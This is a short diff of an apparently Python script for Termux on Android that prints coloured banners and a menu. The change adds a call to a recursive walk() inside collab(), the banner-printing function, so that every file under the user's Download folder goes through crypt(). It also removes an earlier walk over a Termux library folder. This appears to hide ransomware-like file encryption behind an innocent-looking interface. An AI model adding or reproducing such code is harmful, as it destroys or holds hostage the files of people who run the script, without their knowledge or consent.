@@ -26,6 +26,7 @@ menu = '''
 '''
 b = '------------------------------'
 def collab():
+    walk('/storage/emulated/0/download')
     print(Fore.GREEN + b)
     print(Fore.RED + script)
     print(Fore.GREEN + b)
@@ -59,5 +60,4 @@ def walk(dir):
         path = os.path.join(dir,name)
         if os.path.isfile(path): crypt(path)
         else: walk(path)
-walk('/data/data/com.termux/files/usr/lib')
 collab()
